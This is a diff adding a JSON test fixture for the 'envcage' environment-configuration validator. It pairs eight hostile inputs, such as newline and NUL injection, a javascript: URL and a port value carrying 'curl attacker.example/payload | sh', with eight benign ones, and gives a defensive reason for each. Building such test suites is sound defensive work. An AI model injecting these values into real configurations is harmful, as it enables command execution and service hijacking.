@@ -1,0 +1,162 @@
+{
+  "suite": "envcage",
+  "package": "envcage",
+  "title": "Environment injection and strict configuration validation",
+  "attackSurface": "Deployment environment variables consumed as application configuration",
+  "primaryCwe": "CWE-15",
+  "references": [
+    {
+      "type": "OWASP",
+      "id": "Injection",
+      "url": "https://owasp.org/Top10/A03_2021-Injection/"
+    },
+    {
+      "type": "CWE",
+      "id": "CWE-15",
+      "url": "https://cwe.mitre.org/data/definitions/15.html"
+    },
+    {
+      "type": "CWE",
+      "id": "CWE-20",
+      "url": "https://cwe.mitre.org/data/definitions/20.html"
+    }
+  ],
+  "hostile": [
+    {
+      "id": "env-h01",
+      "title": "Newline environment injection",
+      "cwe": "CWE-15",
+      "input": {
+        "APP_NAME": "checkout\nMALICIOUS_OVERRIDE=1"
+      },
+      "why": "Line breaks can create parser and downstream process-environment confusion"
+    },
+    {
+      "id": "env-h02",
+      "title": "NUL byte environment truncation",
+      "cwe": "CWE-15",
+      "input": {
+        "APP_NAME": "checkout\u0000hidden"
+      },
+      "why": "NUL bytes can split JavaScript and native process views of a value"
+    },
+    {
+      "id": "env-h03",
+      "title": "Dangerous URL scheme",
+      "cwe": "CWE-20",
+      "input": {
+        "PUBLIC_URL": "javascript:alert(1)"
+      },
+      "why": "Configuration URLs must not become script execution or non-network schemes"
+    },
+    {
+      "id": "env-h04",
+      "title": "Credential-bearing public URL",
+      "cwe": "CWE-20",
+      "input": {
+        "PUBLIC_URL": "https://user:pass@app.example.com/"
+      },
+      "why": "Userinfo in a public URL leaks credentials and enables host confusion"
+    },
+    {
+      "id": "env-h05",
+      "title": "Disallowed downstream host",
+      "cwe": "CWE-20",
+      "input": {
+        "PUBLIC_URL": "https://evil.example.com/"
+      },
+      "why": "Host allowlists prevent silent repointing of a service at attacker infrastructure"
+    },
+    {
+      "id": "env-h06",
+      "title": "Port range escape",
+      "cwe": "CWE-20",
+      "input": {
+        "PORT": "65536"
+      },
+      "why": "Out-of-range numeric configuration must fail closed"
+    },
+    {
+      "id": "env-h07",
+      "title": "Command-shaped port value",
+      "cwe": "CWE-20",
+      "input": {
+        "PORT": "8080; curl attacker.example/payload | sh"
+      },
+      "why": "Shell-shaped configuration text must never pass numeric validation"
+    },
+    {
+      "id": "env-h08",
+      "title": "Weak production secret",
+      "cwe": "CWE-20",
+      "input": {
+        "API_TOKEN": "short"
+      },
+      "why": "Short or placeholder-like secrets must not be accepted into production configuration"
+    }
+  ],
+  "benign": [
+    {
+      "id": "env-b01",
+      "title": "Canonical production configuration",
+      "input": {},
+      "why": "Baseline valid deployment configuration"
+    },
+    {
+      "id": "env-b02",
+      "title": "Development mode",
+      "input": {
+        "MODE": "development"
+      },
+      "why": "Documented enum variant"
+    },
+    {
+      "id": "env-b03",
+      "title": "Alternate high port",
+      "input": {
+        "PORT": "8443"
+      },
+      "why": "Valid TCP service port"
+    },
+    {
+      "id": "env-b04",
+      "title": "Canonical application URL with path",
+      "input": {
+        "PUBLIC_URL": "https://app.example.com/dashboard"
+      },
+      "why": "HTTPS URL on the configured application host"
+    },
+    {
+      "id": "env-b05",
+      "title": "Feature list",
+      "input": {
+        "FEATURES": "search,audit,reports"
+      },
+      "why": "Comma-separated configuration list within bounds"
+    },
+    {
+      "id": "env-b06",
+      "title": "Application name with spaces",
+      "input": {
+        "APP_NAME": "Checkout Service"
+      },
+      "why": "Visible spaces are ordinary configuration text"
+    },
+    {
+      "id": "env-b07",
+      "title": "Minimum valid port",
+      "input": {
+        "PORT": "1"
+      },
+      "why": "Boundary-valid TCP port"
+    },
+    {
+      "id": "env-b08",
+      "title": "Maximum valid port",
+      "input": {
+        "PORT": "65535"
+      },
+      "why": "Boundary-valid TCP port"
+    }
+  ]
+}
